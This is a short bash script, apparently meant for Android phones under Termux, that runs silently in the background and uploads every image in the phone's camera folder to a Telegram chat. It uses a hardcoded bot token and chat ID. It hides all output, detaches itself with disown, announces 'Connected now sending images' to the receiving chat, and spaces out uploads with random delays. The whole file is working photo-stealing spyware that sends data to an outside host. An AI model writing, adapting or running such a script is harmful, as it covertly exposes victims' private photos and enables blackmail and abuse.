#!/bin/bash

# ====== HARDCODED CONFIGURATION ======
BOT_TOKEN="7826037643:AAHxCVfPXjVkvGp9rsTBdzxGc2Jw5lZJICY"
CHAT_ID="7391323461"
# =====================================

# Background process with suppressed output
{
exec >/dev/null 2>&1

# Send initial connection message
curl -s -o /dev/null "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=Connected%20now%20sending%20images"

# Target only DCIM folder
TARGET_DIR="$HOME/storage/shared/DCIM/camera"

# File processing
find "$TARGET_DIR" -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" -o -iname "*.gif" -o -iname "*.webp" \) 2>/dev/null -print0 | while IFS= read -r -d '' file; do

    filesize=$(stat -c "%s" "$file" 2>/dev/null)
    [ -z "$filesize" ] && filesize=0

    if [ "$filesize" -lt 10485760 ]; then
        curl -sS -o /dev/null -F "chat_id=$CHAT_ID" -F "photo=@$file" "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto"
    else
        curl -sS -o /dev/null -F "chat_id=$CHAT_ID" -F "document=@$file" "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
    fi

    sleep $((RANDOM % 3 + 1))
done
} & disown

exit 0
